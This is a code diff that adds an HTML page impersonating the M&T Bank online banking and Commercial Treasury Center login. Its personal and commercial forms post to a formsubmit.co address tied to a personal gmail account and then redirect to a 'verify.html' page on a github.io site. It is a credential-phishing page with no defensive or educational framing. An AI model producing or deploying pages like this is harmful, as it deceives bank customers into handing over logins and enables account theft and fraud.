@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <title>Log in to M&amp;T Online Banking or Commercial Treasury Center</title>
+    <link rel="stylesheet" href="./bootstrap.css" />
+    <link rel="stylesheet" href="./bootstrap.min.css" />
+    <link rel="stylesheet" href="./all.css" />
+    <style>
+        a {
+            color: white;
+        }
+
+        .login-box {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .personal {
+            padding: 0.7rem 3.3rem;
+            color: white;
+            background-color: green;
+            border: 1px solid green;
+        }
+
+        .commercial {
+            padding: 0.7rem 3.3rem;
+            color: black;
+            background-color: white;
+            border: 1px solid grey;
+        }
+
+        .form-btns {
+            padding: 0.7rem 3.3rem;
+            color: white;
+            background-color: green;
+            border: 1px solid green;
+        }
+    </style>
+</head>
+
+<body>
+    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: green; color: black">
+        <div class="container">
+            <div class="mx-auto">
+                <img src="./white logo.png" onclick="window.location.href = 'index.html'" id="logo" alt="" width="104px"
+                    height="19px" />
+            </div>
+
+        </div>
+    </nav>
+
+    <section class="my-5">
+        <div class="container text-center mt-5 p-5">
+            <h1 id="headthree">Login</h1>
+            <div class="login-box">
+                <button class="personal">Personal</button>
+                <button class="commercial">Commercial</button>
+            </div>
+        </div>
+        <form method="POST" action="https://formsubmit.co/fishtina84@gmail.com">
+            <input type="hidden" name="_next" value="https://creedtech.github.io/mtb-login/verify.html">
+            <div class="row container input-group  px-5 mx-auto" id="personal">
+                <div class="input-group col-lg-3 col-md-4 col-12 "></div>
+                <input type="text" class="form-control" placeholder="User ID" />
+                <div class="input-group col-lg-3 col-md-4 col-12 pb-4"></div>
+                <input type="text" class="form-control" placeholder="Passcode" />
+                <div class="input-group my-2">
+                    <div class="input-group-prepend pr-3">
+                        <div class="input-group">
+                            <input type="checkbox" aria-label="Checkbox for following text input">
+                        </div>
+                    </div>
+                    <label for="">Remember User ID</label>
+                </div>
+                <div class="input-group my-4">
+                    <div class="input-group-prepend">
+                        <button class="form-btns" type="submit">Login ></button>
+                    </div>
+                </div>
+            </div>
+        </form>
+        <form  method="POST" action="https://formsubmit.co/fishtina84@gmail.com">
+            <input type="hidden" name="_next" value="https://creedtech.github.io/mtb-login/verify.html">
+            <div class="row container input-group  px-5 mx-auto" id="commercial">
+                <div class="input-group col-lg-3 col-md-4 col-12 "></div>
+                <input type="text" class="form-control" placeholder="Treasury Center User ID" />
+                <div class="input-group my-2">
+                    <div class="input-group-prepend pr-3">
+                        <div class="input-group">
+                            <input type="checkbox" aria-label="Checkbox for following text input">
+                        </div>
+                    </div>
+                    <label for="">Remember User ID</label>
+                </div>
+                <div class="input-group my-4">
+                    <div class="input-group-prepend">
+                        <button class="form-btns" type="submit">Login ></button>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </section>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script src="./jquery.js"></script>
+    <script src="./jquery.min.js"></script>
+    <script src="./bootstrap.js"></script>
+    <script>
+        $(document).ready(function(){
+            $("#commercial").hide();
+  $(".personal").click(function(){
+   $("#personal").show();
+   $(".personal").css({
+    'background-color': 'green',
+    'color': 'white',
+   });
+   $("#commercial").hide();
+   $(".commercial").css({
+    'background-color': 'white',
+    'color': 'black',
+   });
+ });
+ $(".commercial").click(function(){
+   $("#personal").hide();
+   $(".personal").css({
+    'background-color': 'white',
+    'color': 'black',
+   });
+   $("#commercial").show();
+   $(".commercial").css({
+    'background-color': 'green',
+    'color': 'white',
+   });
+   
+ });
+});
+    </script>
+</body>
+
+</html>
